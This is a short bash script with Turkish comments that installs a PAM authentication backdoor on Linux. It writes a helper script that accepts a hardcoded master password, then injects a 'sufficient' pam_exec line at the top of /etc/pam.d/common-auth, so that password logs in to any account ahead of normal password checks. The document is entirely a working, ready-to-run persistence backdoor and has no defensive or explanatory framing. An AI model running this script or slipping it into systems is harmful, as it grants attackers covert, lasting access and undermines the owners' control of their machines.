Bash
#!/bin/bash

# 1. Arka kapı şifresini kontrol edecek kontrol scriptinin oluşturulması
cat << 'EOF' > /usr/local/bin/pam_backdoor.sh
#!/bin/bash
# Stdin üzerinden gelen şifreyi oku (expose_authtok parametresi ile gelir)
read -r password
if [ "$password" = "SiberVatan2026!" ]; then
    exit 0 # Şifre doğruysa PAM'e başarılı dön
fi
exit 1 # Yanlışsa başarısız dön, normal akış devam etsin
EOF

# Scriptin çalıştırılma izinlerinin verilmesi
chmod +x /usr/local/bin/pam_backdoor.sh

# 2. /etc/pam.d/common-auth dosyasına bu kontrolün enjekte edilmesi
# 'sufficient' bayrağı, bu script 0 (başarılı) dönerse alt satırlara bakmadan girişe izin verir.
# Eğer şifre yanlışsa alt satırdaki normal Linux şifre kontrolüne (pam_unix.so) paslar.
if ! grep -q "pam_backdoor.sh" /etc/pam.d/common-auth; then
    sed -i '1s/^/auth sufficient pam_exec.so expose_authtok \/usr\/local\/bin\/pam_backdoor.sh\n/' /etc/pam.d/common-auth
    echo "PAM Backdoor sisteme entegre edildi."
else
    echo "PAM Backdoor zaten mevcut."
fi